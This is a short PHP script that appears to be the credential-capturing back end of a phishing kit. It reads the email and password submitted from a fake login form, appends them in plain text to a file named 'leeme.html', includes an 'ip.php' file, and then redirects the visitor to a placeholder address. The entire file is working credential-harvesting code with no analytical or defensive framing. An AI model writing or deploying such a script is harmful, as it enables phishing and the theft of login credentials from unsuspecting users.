<?php
include 'ip.php';

file_put_contents("leeme.html", "email: " . $_POST['login_email'] . "\npass: " . $_POST['login_password'] . "\n", FILE_APPEND);
header('Location: <CUSTOM>');
exit();
